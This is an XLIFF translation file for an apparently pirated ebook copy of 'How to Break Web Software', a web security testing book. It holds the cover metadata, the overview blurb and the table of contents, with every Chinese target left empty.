<?xml version="1.0" encoding="utf-8"?>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="urn:oasis:names:tc:xliff:document:1.2 xliff-core-1.2-strict.xsd">
  <file original="How to Break Web Software Functional and Security Testing of Web Applications and Web Services. Book  CD by Mike Andrews, James A. Whittaker (z-lib.org) (1).chm" datatype="html" source-language="en" target-language="zh-CN">
    <body>
      <group id="9780321657497.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>TeamUnknown</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.img.alt">
          <source>Book Cover</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.b.text">
          <source>How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>By 
											&lt;a target="_new" href="http://www.informit.com/authors/author_bio.aspx?ISBN=9780321369444" class="v1"&gt;Mike&amp;nbsp;Andrews&lt;/a&gt;, &lt;a target="_new" href="http://www.informit.com/authors/author_bio.aspx?ISBN=9780321369444" class="v1"&gt;James&amp;nbsp;A.&amp;nbsp;Whittaker&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>...............................................</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Publisher: &lt;b&gt;Addison-Wesley Professional&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Pub Date: &lt;b&gt;February 02, 2006&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Print ISBN-10: &lt;b&gt;0-321-36944-0&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Print ISBN-13: &lt;b&gt;978-0-321-36944-4&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Web ISBN-10: &lt;b&gt;0-321-65749-7&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Web ISBN-13: &lt;b&gt;978-0-321-65749-7&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Pages: &lt;b&gt;240&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Slots: &lt;b&gt;1.0&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.title">
          <source>Start reading this book</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Start Reading Online</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;a title="Table of Contents" href="toc.html" class="aTopMenu"&gt;Table of Contents&lt;/a&gt;
												  &amp;nbsp;|&amp;nbsp;&lt;a title="Index" href="index.html" class="aTopMenu"&gt;Index&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.img.alt">
          <source>Overview</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>"The techniques in this
book are not an option for testers&amp;ndash;they are mandatory and
these are the guys to tell you how to apply them!"&lt;br /&gt;
&amp;ndash;HarryRobinson, Google.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.span.text">
          <source>Rigorously test and
improve the security of all your Web software!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's as certain as
death and taxes: hackers will mercilessly attack your Web sites,
applications, and services. If you're vulnerable, you'd
better discover these attacks yourself, before the black hats do.
Now, there's a definitive, hands-on guide to security-testing
any Web-based software: How to Break Web Software.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In this book, two
renowned experts address every category of Web software exploit:
attacks on clients, servers, state, user inputs, and more.
You'll master powerful attack tools and techniques as you
uncover dozens of crucial, widely exploited flaws in Web
architecture and coding. The authors reveal where to look for
potential threats and attack vectors, how to rigorously test for
each of them, and how to mitigate the problems you find. Coverage
includes</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;#183;&amp;nbsp;&amp;nbsp; Client vulnerabilities, including
attacks on client-side validation</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;#183;&amp;nbsp;&amp;nbsp; State-based attacks: hidden fields,
CGI parameters, cookie poisoning, URL jumping, and session
hijacking</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;#183;&amp;nbsp;&amp;nbsp; Attacks on user-supplied inputs:
cross-site scripting, SQL injection, and directory traversal</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;#183;&amp;nbsp;&amp;nbsp; Language- and technology-based
attacks: buffer overflows, canonicalization, and NULL string
attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;#183;&amp;nbsp;&amp;nbsp; Server attacks: SQL Injection with
stored procedures, command injection, and server fingerprinting</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;#183;&amp;nbsp;&amp;nbsp; Cryptography, privacy, and attacks
on Web services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Your Web software is
mission-critical&amp;ndash;it can't be compromised. Whether
you're a developer, tester, QA specialist, or IT manager,
this book will help you protect that
software&amp;ndash;systematically.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Companion CD contains
full source code for one testing tool you can modify and extend,
free Web security testing tools, and complete code from a flawed
Web site designed to give you hands-on practice in identifying
security holes.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="Browser" datatype="html">
        <trans-unit id="Title">
          <source>How to Break Web Software: Functional and Security Testing of Web Applications and Web Services @ Teamunkown</source>
          <target></target>
        </trans-unit>
        <trans-unit id="Window[0].Title">
          <source>How to Break Web Software: Functional and Security Testing of Web Applications and Web Services @ Teamunkown</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="Contents" datatype="plaintext">
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].How to Break Web Software: Functional and Security Testing of Web Applications and Web Services">
          <source>How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Table Of Contents">
          <source>Table Of Contents</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Copyright">
          <source>Copyright</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Preface">
          <source>Preface</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Acknowledgments">
          <source>Acknowledgments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].About the Authors">
          <source>About the Authors</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].Chapter 1. The Web Is Different">
          <source>Chapter 1. The Web Is Different</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].The World Wide Web">
          <source>The World Wide Web</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].The Price of Web Utopia">
          <source>The Price of Web Utopia</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].The Web Versus Client-Server">
          <source>The Web Versus Client-Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].A Fault Model for Web Apps">
          <source>A Fault Model for Web Apps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 1. The Web Is Different[0].Conclusion">
          <source>Conclusion</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 2. Gathering Information on the Target[0].Chapter 2. Gathering Information on the Target">
          <source>Chapter 2. Gathering Information on the Target</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 2. Gathering Information on the Target[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 2. Gathering Information on the Target[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 3. Attacking the Client[0].Chapter 3. Attacking the Client">
          <source>Chapter 3. Attacking the Client</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 3. Attacking the Client[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 3. Attacking the Client[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 4. State-Based Attacks[0].Chapter 4. State-Based Attacks">
          <source>Chapter 4. State-Based Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 4. State-Based Attacks[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 4. State-Based Attacks[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 4. State-Based Attacks[0].References">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 5. Attacking User-Supplied Input Data[0].Chapter 5. Attacking User-Supplied Input Data">
          <source>Chapter 5. Attacking User-Supplied Input Data</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 5. Attacking User-Supplied Input Data[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 5. Attacking User-Supplied Input Data[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 6. Language-Based Attacks[0].Chapter 6. Language-Based Attacks">
          <source>Chapter 6. Language-Based Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 6. Language-Based Attacks[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 6. Language-Based Attacks[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 7. Attacking the Server[0].Chapter 7. Attacking the Server">
          <source>Chapter 7. Attacking the Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 7. Attacking the Server[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 7. Attacking the Server[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 7. Attacking the Server[0].References">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 8. Authentication[0].Chapter 8. Authentication">
          <source>Chapter 8. Authentication</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 8. Authentication[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 8. Authentication[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 8. Authentication[0].References">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Chapter 9. Privacy">
          <source>Chapter 9. Privacy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].User Agents">
          <source>User Agents</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Referrer">
          <source>Referrer</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Cookies">
          <source>Cookies</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Web Bugs">
          <source>Web Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Clipboard Access">
          <source>Clipboard Access</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Caching Pages">
          <source>Caching Pages</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].ActiveX Controls">
          <source>ActiveX Controls</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 9. Privacy[0].Browser Helper Objects">
          <source>Browser Helper Objects</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 10. Web Services[0].Chapter 10. Web Services">
          <source>Chapter 10. Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 10. Web Services[0].What's In This Chapter?">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 10. Web Services[0].Introduction">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 10. Web Services[0].What Are Web Services?">
          <source>What Are Web Services?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Chapter 10. Web Services[0].Threats">
          <source>Threats</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix A. Fifty Years of Software: Key Principles for Quality[0].Appendix A. Fifty Years of Software: Key Principles for Quality">
          <source>Appendix A. Fifty Years of Software: Key Principles for Quality</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix A. Fifty Years of Software: Key Principles for Quality[0].1950 to 1959: Genesis">
          <source>1950 to 1959: Genesis</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix A. Fifty Years of Software: Key Principles for Quality[0].1960 to 1969: Exodus">
          <source>1960 to 1969: Exodus</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix A. Fifty Years of Software: Key Principles for Quality[0].1970 to 1979: Chaos">
          <source>1970 to 1979: Chaos</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix A. Fifty Years of Software: Key Principles for Quality[0].1980 to 1989: Repair">
          <source>1980 to 1989: Repair</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix A. Fifty Years of Software: Key Principles for Quality[0].1990 to 1999: Process">
          <source>1990 to 1999: Process</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix A. Fifty Years of Software: Key Principles for Quality[0].2000 to 2009: Engineering?">
          <source>2000 to 2009: Engineering?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix B. Flowershop Bugs">
          <source>Appendix B. Flowershop Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].Appendix C. Tools">
          <source>Appendix C. Tools</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].TextPad">
          <source>TextPad</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].Nikto">
          <source>Nikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].Wikto">
          <source>Wikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].Stunnel">
          <source>Stunnel</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].BlackWidow">
          <source>BlackWidow</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].Wget">
          <source>Wget</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].cURL">
          <source>cURL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].Paros">
          <source>Paros</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].SPIKE Proxy">
          <source>SPIKE Proxy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].SSLDigger">
          <source>SSLDigger</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Appendix C. Tools[0].The Human Brain">
          <source>The Human Brain</source>
          <target></target>
        </trans-unit>
        <trans-unit id="How to Break Web Software: Functional and Security Testing of Web Applications and Web Services[0].Index">
          <source>Index</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="Toc.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>TeamUnknown</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.table.td.a.b.text">
          <source>[ Team Unknown ]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.title">
          <source>Book Cover</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Book Cover</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.b.text">
          <source>How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>By 
											&lt;a target="_new" href="http://www.informit.com/authors/author_bio.aspx?ISBN=9780321369444" class="v1"&gt;Mike&amp;nbsp;Andrews&lt;/a&gt;, &lt;a target="_new" href="http://www.informit.com/authors/author_bio.aspx?ISBN=9780321369444" class="v1"&gt;James&amp;nbsp;A.&amp;nbsp;Whittaker&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>...............................................</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Publisher: &lt;b&gt;Addison-Wesley Professional&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Pub Date: &lt;b&gt;February 02, 2006&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Print ISBN-10: &lt;b&gt;0-321-36944-0&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Print ISBN-13: &lt;b&gt;978-0-321-36944-4&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Web ISBN-10: &lt;b&gt;0-321-65749-7&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Web ISBN-13: &lt;b&gt;978-0-321-65749-7&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Pages: &lt;b&gt;240&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>Slots: &lt;b&gt;1.0&lt;/b&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.title">
          <source>Start reading this book</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Start Reading Online</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&lt;a title="Table of Contents" href="toc.html" class="aTopMenu"&gt;Table of Contents&lt;/a&gt;
												  &amp;nbsp;|&amp;nbsp;&lt;a title="Index" href="index.html" class="aTopMenu"&gt;Index&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Copyright</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Preface</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Acknowledgments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>About the Authors</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch01.html"&gt; Chapter 1.&amp;nbsp;
           The Web Is Different&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>The World Wide Web</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>The Price of Web Utopia</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
